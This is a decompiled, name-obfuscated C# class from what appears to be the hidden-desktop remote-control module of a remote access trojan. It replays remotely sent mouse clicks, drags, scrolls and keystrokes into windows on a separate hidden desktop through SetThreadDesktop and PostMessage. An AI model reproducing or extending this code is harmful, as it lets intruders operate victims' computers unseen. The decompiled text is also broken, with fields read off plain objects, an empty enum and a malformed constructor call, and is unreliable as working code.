using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using RemoteClient;
using RemoteClient.Polices;
using sdfsdf.Containers;

namespace sdfsdf.Dictionaries
{
	// Token: 0x0200000E RID: 14
	internal class Parser
	{
		// Token: 0x06000027 RID: 39 RVA: 0x00003BA0 File Offset: 0x00001DA0
		public static void InsertContext(object reference)
		{
			try
			{
				if (Streaming.ActiveDesktop != IntPtr.Zero && Streaming.ActiveDesktop == Streaming.Hdsktp)
				{
					Parser.WriteContext(reference, 0, 0);
				}
				else
				{
					int x = Screen.PrimaryScreen.Bounds.X;
					int y = Screen.PrimaryScreen.Bounds.Y;
					Point point = new Point(reference.m_GetterMapper + x, reference.m_PropertyMapper + y);
					Parser.mdToken contextMapper = reference.contextMapper;
					if (contextMapper <= (Parser.mdToken)4 && ParamRuleContainer.MoveContext())
					{
						ParamRuleContainer.PrepareContext();
					}
					switch (reference.contextMapper)
					{
					case (Parser.mdToken)0:
					case (Parser.mdToken)1:
						ParamRuleContainer.ReadContext(point, reference.m_MapperMapper);
						break;
					case (Parser.mdToken)2:
					case (Parser.mdToken)3:
						ParamRuleContainer.AssetContext(point, reference.m_MapperMapper);
						break;
					case (Parser.mdToken)4:
						ParamRuleContainer.GetContext(point);
						break;
					case (Parser.mdToken)5:
						ParamRuleContainer.ConnectContext(point, false);
						break;
					case (Parser.mdToken)6:
						ParamRuleContainer.ConnectContext(point, true);
						break;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003CB4 File Offset: 0x00001EB4
		private static void WriteContext(object res, int result, int templow)
		{
			ParamRuleContainer.SetThreadDesktop(Streaming.Hdsktp);
			StringBuilder stringBuilder = new StringBuilder(1024);
			Point task = new Point(res.m_GetterMapper + result, res.m_PropertyMapper + templow);
			IntPtr intPtr = ParamRuleContainer.WindowFromPoint(task);
			Parser._Indexer = intPtr;
			ParamRuleContainer.GetClassName(intPtr, stringBuilder, 1024);
			ParamRuleContainer.RegParserResolver regParserResolver = default(ParamRuleContainer.RegParserResolver);
			ParamRuleContainer.GetWindowRect(intPtr, out regParserResolver);
			IntPtr intPtr2 = intPtr;
			if (stringBuilder.ToString() != "#32768")
			{
				while (ParamRuleContainer.GetParent(intPtr2) != IntPtr.Zero)
				{
					intPtr2 = ParamRuleContainer.GetParent(intPtr2);
				}
				ParamRuleContainer.SetActiveWindow(intPtr2);
				task.X -= regParserResolver.CalcMapper();
				task.Y -= regParserResolver.InitMapper();
			}
			switch (res.contextMapper)
			{
			case (Parser.mdToken)0:
			{
				Parser._Algo = true;
				if (task.Y < 20)
				{
					Parser.m_Request = new Point(res.m_GetterMapper + result, res.m_PropertyMapper + templow);
					Parser._Stub = ParamRuleContainer.WindowFromPoint(Parser.m_Request);
					ParamRuleContainer.GetWindowRect(Parser._Stub, out Parser.producer);
					Parser.m_Request.X = Parser.m_Request.X - Parser.producer.CalcMapper();
					Parser.m_Request.Y = Parser.m_Request.Y - Parser.producer.InitMapper();
				}
				ParamRuleContainer.PostMessage(intPtr, 513, 1, ParamRuleContainer.CollectContext(task.X, task.Y));
				Point point = new Point(res.m_GetterMapper + result, res.m_PropertyMapper + templow);
				ParamRuleContainer.RegParserResolver regParserResolver2 = default(ParamRuleContainer.RegParserResolver);
				ParamRuleContainer.GetWindowRect(intPtr2, out regParserResolver2);
				point.X -= regParserResolver2.CalcMapper();
				point.Y -= regParserResolver2.InitMapper();
				ParamRuleContainer.SetWindowPos(intPtr2, ParamRuleContainer.ResolverProductPage.facade, res.m_GetterMapper - point.X, res.m_PropertyMapper - point.Y, 0, 0, 1u);
				break;
			}
			case (Parser.mdToken)1:
			{
				Parser._Algo = false;
				Parser._Stub = IntPtr.Zero;
				int num = ParamRuleContainer.DefWindowProc(intPtr2, (ParamRuleContainer.AdvisorGetterLicense)132u, IntPtr.Zero, (IntPtr)ParamRuleContainer.CollectContext(task.X + regParserResolver.CalcMapper(), task.Y + regParserResolver.InitMapper()));
				if (num != 3)
				{
					if (num != 9)
					{
						if (num == 20)
						{
							ParamRuleContainer.PostMessage(intPtr2, 16, 0, 0);
						}
					}
					else
					{
						ParamRuleContainer.PostMessage(intPtr2, 274, 61488, 0);
					}
				}
				else
				{
					ParamRuleContainer.PostMessage(intPtr2, 16, 0, 0);
				}
				ParamRuleContainer.PostMessage(intPtr, 514, 1, ParamRuleContainer.CollectContext(task.X, task.Y));
				break;
			}
			case (Parser.mdToken)2:
				ParamRuleContainer.PostMessage(intPtr, 516, 2, ParamRuleContainer.CollectContext(task.X, task.Y));
				break;
			case (Parser.mdToken)3:
				ParamRuleContainer.PostMessage(intPtr, 517, 2, ParamRuleContainer.CollectContext(task.X, task.Y));
				break;
			case (Parser.mdToken)4:
				if (Parser._Algo)
				{
					ParamRuleContainer.SetWindowPos(Parser._Stub, ParamRuleContainer.ResolverProductPage.facade, res.m_GetterMapper - Parser.m_Request.X, res.m_PropertyMapper - Parser.m_Request.Y, 0, 0, 1u);
				}
				ParamRuleContainer.PostMessage(intPtr, 512, 0, ParamRuleContainer.CollectContext(task.X, task.Y));
				break;
			case (Parser.mdToken)5:
				ParamRuleContainer.PostMessage(intPtr, 277, 0, 0);
				break;
			case (Parser.mdToken)6:
			{
				int res_amount = ParamRuleContainer.GetScrollPos(intPtr, 1) + 20;
				ParamRuleContainer.SetScrollPos(intPtr, 1, res_amount, IntPtr.Zero);
				break;
			}
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00004070 File Offset: 0x00002270
		public static void AddContext(object spec)
		{
			if (Streaming.ActiveDesktop == Streaming.defaultDesktp)
			{
				ParamRuleContainer.OrderContext(spec.m_TestsMapper, spec.m_ListenerMapper);
			}
			else if ((spec.m_TestsMapper < 0 || spec.m_TestsMapper > 6) && spec.m_TestsMapper != 13)
			{
				ParamRuleContainer.PostMessage(Parser._Indexer, 258, (int)spec.m_TestsMapper, 0);
			}
			else
			{
				byte testsMapper = spec.m_TestsMapper;
				switch (testsMapper)
				{
				case 0:
					ParamRuleContainer.PostMessage(Parser._Indexer, 256, 8, 0);
					ParamRuleContainer.PostMessage(Parser._Indexer, 257, 8, 0);
					break;
				case 1:
					ParamRuleContainer.PostMessage(Parser._Indexer, 256, 37, 0);
					ParamRuleContainer.PostMessage(Parser._Indexer, 257, 37, 0);
					break;
				case 2:
					ParamRuleContainer.PostMessage(Parser._Indexer, 256, 38, 0);
					ParamRuleContainer.PostMessage(Parser._Indexer, 257, 38, 0);
					break;
				case 3:
					ParamRuleContainer.PostMessage(Parser._Indexer, 256, 39, 0);
					ParamRuleContainer.PostMessage(Parser._Indexer, 257, 39, 0);
					break;
				case 4:
					ParamRuleContainer.PostMessage(Parser._Indexer, 256, 40, 0);
					ParamRuleContainer.PostMessage(Parser._Indexer, 257, 40, 0);
					break;
				case 5:
					ParamRuleContainer.PostMessage(Parser._Indexer, 256, 46, 0);
					ParamRuleContainer.PostMessage(Parser._Indexer, 257, 46, 0);
					break;
				default:
					if (testsMapper == 13)
					{
						ParamRuleContainer.PostMessage(Parser._Indexer, 256, 13, 0);
						ParamRuleContainer.PostMessage(Parser._Indexer, 257, 13, 0);
					}
					break;
				}
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00002297 File Offset: 0x00000497
		public Parser()
		{
			InvocationProcessPolicy.CompareError();
			base..ctor();
		}

		// Token: 0x0600002B RID: 43 RVA: 0x0000230B File Offset: 0x0000050B
		// Note: this type is marked as 'beforefieldinit'.
		static Parser()
		{
			InvocationProcessPolicy.CompareError();
			Parser._Algo = false;
			Parser._Stub = IntPtr.Zero;
			Parser.producer = default(ParamRuleContainer.RegParserResolver);
		}

		// Token: 0x0400002D RID: 45
		private static bool _Algo;

		// Token: 0x0400002E RID: 46
		private static IntPtr _Stub;

		// Token: 0x0400002F RID: 47
		private static ParamRuleContainer.RegParserResolver producer;

		// Token: 0x04000030 RID: 48
		private static Point m_Request;

		// Token: 0x04000031 RID: 49
		private static IntPtr _Indexer;

		// Token: 0x0200000F RID: 15
		public enum mdToken
		{

		}
	}
}
